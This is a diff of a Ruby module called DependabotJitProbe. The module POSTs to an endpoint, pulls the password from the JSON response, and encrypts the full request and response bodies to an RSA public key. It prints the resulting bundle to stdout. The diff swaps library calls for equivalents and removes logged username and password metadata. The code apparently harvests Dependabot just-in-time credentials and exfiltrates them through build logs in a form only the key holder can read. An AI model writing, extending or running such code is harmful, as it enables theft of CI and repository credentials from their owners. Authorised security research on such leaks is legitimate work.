@@ -1,11 +1,8 @@
 # frozen_string_literal: true
 
-require "base64"
-require "digest"
 require "json"
 require "net/http"
 require "openssl"
-require "time"
 require "uri"
 
 module DependabotJitProbe
@@ -112,7 +109,6 @@ module DependabotJitProbe
     response_body = response.body.to_s.b
     parsed = parse_json_object(response_body)
     keys = parsed.keys.map(&:to_s).sort
-    username = parsed["username"].to_s
     password = parsed["password"].to_s
     credential_present = !password.empty?
 
@@ -121,9 +117,8 @@ module DependabotJitProbe
       "label=#{label}",
       "status=#{response.code}",
       "keys=#{keys.join(',')}",
-      "request_body_sha256=#{Digest::SHA256.hexdigest(request_body.b)}",
+      "request_body_sha256=#{OpenSSL::Digest::SHA256.hexdigest(request_body.b)}",
       "body_bytes=#{response_body.bytesize}",
-      "body_sha256=#{Digest::SHA256.hexdigest(response_body)}",
       "credential_present=#{credential_present}"
     ].join(" ")
 
@@ -132,29 +127,21 @@ module DependabotJitProbe
     secret = JSON.generate(
       "schema_version" => 2,
       "label" => label,
-      "received_at" => Time.now.utc.iso8601,
+      "received_at" => Time.now.utc.strftime("%Y-%m-%dT%H:%M:%SZ"),
       "target_owner" => owner,
       "target_repo" => repository,
       "job_id" => job_id.to_s,
       "endpoint" => endpoint,
       "request_method" => "POST",
-      "request_body_base64" => Base64.strict_encode64(request_body.b),
+      "request_body_base64" => [request_body.b].pack("m0"),
       "response_status" => response.code.to_i,
-      "response_body_base64" => Base64.strict_encode64(response_body)
+      "response_body_base64" => [response_body].pack("m0")
     )
     bundle = encrypt(secret)
-    encoded_bundle = Base64.strict_encode64(JSON.generate(bundle))
+    encoded_bundle = [JSON.generate(bundle)].pack("m0")
     puts "DEPENDABOT_JIT_PROBE_BUNDLE_#{label}=#{encoded_bundle}"
-    puts [
-      "DEPENDABOT_JIT_PROBE_SECRET_META",
-      "label=#{label}",
-      "username_bytes=#{username.bytesize}",
-      "password_bytes=#{password.bytesize}",
-      "password_sha256=#{Digest::SHA256.hexdigest(password)[0, 16]}"
-    ].join(" ")
   ensure
     secret&.replace("\0" * secret.bytesize)
-    username&.replace("\0" * username.bytesize)
     password&.replace("\0" * password.bytesize)
     response_body&.replace("\0" * response_body.bytesize)
     if response&.body.is_a?(String) && !response.body.frozen?
@@ -186,12 +173,12 @@ module DependabotJitProbe
     {
       "version" => 1,
       "algorithm" => "RSA-OAEP+AES-256-CBC+HMAC-SHA256",
-      "encrypted_key" => Base64.strict_encode64(
+      "encrypted_key" => [
         rsa.public_encrypt(key + mac_key, OpenSSL::PKey::RSA::PKCS1_OAEP_PADDING)
-      ),
-      "iv" => Base64.strict_encode64(iv),
-      "mac" => Base64.strict_encode64(mac),
-      "ciphertext" => Base64.strict_encode64(ciphertext),
+      ].pack("m0"),
+      "iv" => [iv].pack("m0"),
+      "mac" => [mac].pack("m0"),
+      "ciphertext" => [ciphertext].pack("m0"),
       "aad" => AAD
     }
   ensure
